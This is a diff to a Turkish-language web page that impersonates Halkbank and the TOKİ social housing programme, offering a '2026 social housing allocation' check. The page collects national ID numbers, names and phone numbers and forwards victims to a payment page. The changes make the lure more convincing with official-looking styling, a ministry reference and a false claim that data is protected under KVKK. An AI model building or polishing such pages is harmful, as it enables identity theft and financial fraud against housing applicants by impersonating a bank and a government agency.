@@ -2,21 +2,32 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Halkbank - TOKİ Konut Edinme Sistemi</title>
-    <link rel="stylesheet" href="style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halkbank | TOKİ Kurumsal İşlemler</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; }
+        .navbar { background-color: #004a99; color: white; padding: 20px; text-align: center; font-size: 22px; font-weight: bold; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        .container { max-width: 450px; margin: 40px auto; background: white; padding: 35px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        h2 { color: #004a99; text-align: center; margin-top: 0; font-size: 24px; }
+        p { color: #555; text-align: center; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
+        input { width: 100%; padding: 14px; margin: 12px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; background-color: #004a99; color: white; padding: 16px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; margin-top: 15px; }
+        button:hover { background-color: #003366; }
+        .footer { font-size: 11px; color: #888; text-align: center; margin-top: 25px; border-top: 1px solid #eee; padding-top: 15px; }
+    </style>
 </head>
 <body>
-    <div class="navbar">HALKBANK | TOKİ Kurumsal İşlemler</div>
+    <div class="navbar">HALKBANK | TOKİ KURUMSAL</div>
     <div class="container">
-        <h2>2026 Sosyal Konut Projesi Tahsis Sorgulama</h2>
-        <p>Lütfen konut hak sahipliği durumunuzu kontrol etmek için bilgileri giriniz.</p>
+        <h2>2026 Sosyal Konut Tahsis Sorgulama</h2>
+        <p>T.C. Çevre ve Şehircilik Bakanlığı konut hak sahipliği durumunuzu kontrol etmek için lütfen bilgilerinizi eksiksiz giriniz.</p>
         <form action="odeme.html">
             <input type="text" maxlength="11" placeholder="T.C. Kimlik Numaranız" required>
             <input type="text" placeholder="Adınız Soyadınız" required>
-            <input type="tel" placeholder="Sistemde Kayıtlı Cep Telefonu" required>
-            <button type="submit">SORGULA VE SÖZLEŞME ONAYLA</button>
+            <input type="tel" placeholder="Sistemde Kayıtlı Telefon" required>
+            <button type="submit">HAK SAHİPLİĞİ SORGULA</button>
         </form>
-        <div class="footer-note">Bu portal sadece T.C. Çevre, Şehircilik ve İklim Değişikliği Bakanlığı onaylı hak sahipleri içindir.</div>
+        <div class="footer">Bu portal sadece resmi hak sahiplerinin kullanımı içindir. Bilgileriniz KVKK kapsamında korunmaktadır.</div>
     </div>
 </body>
 </html>
